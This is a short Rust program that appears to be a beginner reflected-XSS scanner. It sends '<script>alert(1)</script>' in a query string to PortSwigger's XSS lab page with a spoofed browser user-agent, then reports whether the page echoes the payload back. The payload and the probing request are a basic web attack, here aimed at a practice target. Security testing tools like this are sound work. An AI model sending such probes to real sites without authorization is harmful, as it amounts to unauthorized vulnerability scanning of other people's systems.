// Created by inc0gnit0, skript0r, ElementalX, p4yl0ad
// Latest update: 6/11/20
// Version: 0.0.1

// Dependencies
use isahc::prelude::*; // 0.9.3
use regex::Regex; // 1.3.9

// Main
fn main() -> Result<(), Box<dyn std::error::Error>> {
    let ua = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36";
    let payload = "<script>alert(1)</script>";
    let template = "https://portswigger-labs.net/xss/xss.php?x=$";
    // This regex below replaces $ with the payload
    let re = Regex::new("\\$").unwrap();
    let url = re.replace(template, payload).to_string();
    let url = url_encode(&url);
    // Sends request
    let request = Request::get(url)
        .header("user-agent", ua)
        .body(())?
        .send()?
        .text()?;

    let source = request.contains(payload);

    if source == true {
        println!("Website is vulnerble");
    } else {
        println!("Website is not vulnerbale");
    }
    Ok(())
}

// Sanitizes URL
fn url_encode(data: &str) -> String {
    fn str_to_ascii_num(char: &str) -> u8 {
        let chars: Vec<_> = char.bytes().map(|c| c as char).collect();
        return chars[0] as u8;
    }
    let unsafe_chars: Vec<&str> = vec![
        " ", "'", "\"", ">", "<", "#", "%", "{", "}", "|", "\\", "^", "~", "[", "]", "+",
    ];
    let unsafe_nums: Vec<u8> = unsafe_chars.iter().map(|c| str_to_ascii_num(c)).collect();
    let supplied_nums: Vec<u8> = data.bytes().map(|b| b as u8).collect();
    let mut buffer = String::new();
    for num in supplied_nums {
        if unsafe_nums.contains(&num) {
            let sanitized = format!("%{:x?}", num).to_uppercase();
            buffer.push_str(&sanitized);
        } else {
            let sanitized = format!("{}", num as char);
            buffer.push_str(&sanitized);
        }
    }
    return buffer;
}
